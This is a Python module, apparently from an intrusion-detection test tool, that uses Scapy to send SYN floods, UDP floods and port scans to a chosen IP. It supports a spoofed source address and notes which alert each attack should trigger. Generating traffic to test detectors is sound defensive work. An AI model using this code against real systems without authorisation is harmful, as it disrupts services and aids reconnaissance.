from __future__ import annotations

import random
import time
from datetime import datetime
from typing import Dict

try:
    from scapy.all import IP, TCP, UDP, Raw, RandShort, conf, send
except ImportError:  # pragma: no cover - handled at runtime
    IP = TCP = UDP = Raw = RandShort = conf = send = None


ATTACK_LIBRARY: Dict[str, dict] = {
    "syn_flood": {
        "label": "SYN Flood",
        "description": "High-rate TCP SYN burst against one port.",
        "default_count": 240,
        "default_port": 80,
        "hint": "Expected to trigger SYN flood or anomalous TCP activity.",
        "default_interval": 0.003,
        "default_payload_size": 0,
        "proto": 6,
    },
    "udp_flood": {
        "label": "UDP Flood",
        "description": "Repeated UDP datagrams with large payloads.",
        "default_count": 180,
        "default_port": 53,
        "hint": "Expected to raise UDP flood risk.",
        "default_interval": 0.003,
        "default_payload_size": 1200,
        "proto": 17,
    },
    "port_scan": {
        "label": "Port Scan",
        "description": "Sequential TCP SYN probes across many ports.",
        "default_count": 120,
        "default_port": 20,
        "hint": "Expected to surface as PORTSCAN-like traffic.",
        "default_interval": 0.01,
        "default_payload_size": 0,
        "proto": 6,
    },
}


def _ensure_scapy() -> None:
    if send is None or IP is None:
        raise RuntimeError("Scapy is not installed. Install backend requirements before running real traffic tests.")


def available_attack_types() -> Dict[str, dict]:
    return ATTACK_LIBRARY


def simulate_attack(
    attack_type: str,
    target_ip: str,
    packet_count: int | None = None,
    target_port: int | None = None,
    start_port: int | None = None,
    payload_size: int | None = None,
    interval: float | None = None,
    iface: str | None = None,
    source_ip: str | None = None,
) -> dict:
    _ensure_scapy()

    normalized = (attack_type or "").strip().lower()
    if normalized not in ATTACK_LIBRARY:
        supported = ", ".join(sorted(ATTACK_LIBRARY))
        raise ValueError(f"Unsupported attack type '{attack_type}'. Supported: {supported}")

    spec = ATTACK_LIBRARY[normalized]
    packet_count = int(packet_count or spec["default_count"])
    target_port = target_port if target_port is not None else spec["default_port"]
    start_port = start_port if start_port is not None else spec["default_port"]
    payload_size = int(payload_size if payload_size is not None else spec.get("default_payload_size", 1200))
    interval = float(interval if interval is not None else spec.get("default_interval", 0.02))
    send_kwargs = {"inter": interval, "verbose": False}
    original_iface = getattr(conf, "iface", None) if conf is not None else None
    if iface and conf is not None:
        conf.iface = iface

    started = time.time()
    source_port = int(RandShort()) if RandShort is not None else random.randint(1024, 65535)
    packets = []

    def ip_layer():
        if source_ip:
            return IP(src=source_ip, dst=target_ip)
        return IP(dst=target_ip)

    try:
        if normalized == "syn_flood":
            if target_port is None:
                raise ValueError("target_port is required for syn_flood")
            packets = [
                ip_layer() / TCP(sport=source_port, dport=target_port, flags="S", seq=random.randint(0, 2**32 - 1))
                for _ in range(packet_count)
            ]
            for idx, packet in enumerate(packets):
                packet.time = started + (idx * interval)
            send(packets, **send_kwargs)

        elif normalized == "udp_flood":
            if target_port is None:
                raise ValueError("target_port is required for udp_flood")
            packets = [
                ip_layer() / UDP(sport=source_port, dport=target_port) / Raw(load=b"U" * payload_size)
                for _ in range(packet_count)
            ]
            for idx, packet in enumerate(packets):
                packet.time = started + (idx * interval)
            send(packets, **send_kwargs)

        elif normalized == "port_scan":
            base_port = int(start_port or 20)
            packets = [
                ip_layer() / TCP(sport=source_port, dport=base_port + offset, flags="S", seq=random.randint(0, 2**32 - 1))
                for offset in range(packet_count)
            ]
            for idx, packet in enumerate(packets):
                packet.time = started + (idx * interval)
            send(packets, **send_kwargs)
    finally:
        if conf is not None and original_iface is not None:
            conf.iface = original_iface

    duration = round(time.time() - started, 3)
    return {
        "attack_type": normalized,
        "attack_label": spec["label"],
        "description": spec["description"],
        "hint": spec["hint"],
        "proto": spec.get("proto"),
        "target_ip": target_ip,
        "target_port": target_port,
        "start_port": start_port,
        "packet_count": packet_count,
        "payload_size": payload_size,
        "interval": interval,
        "iface": iface,
        "source_ip": source_ip,
        "sent_at": datetime.utcnow().isoformat() + "Z",
        "duration_seconds": duration,
        "_packets": packets,
    }
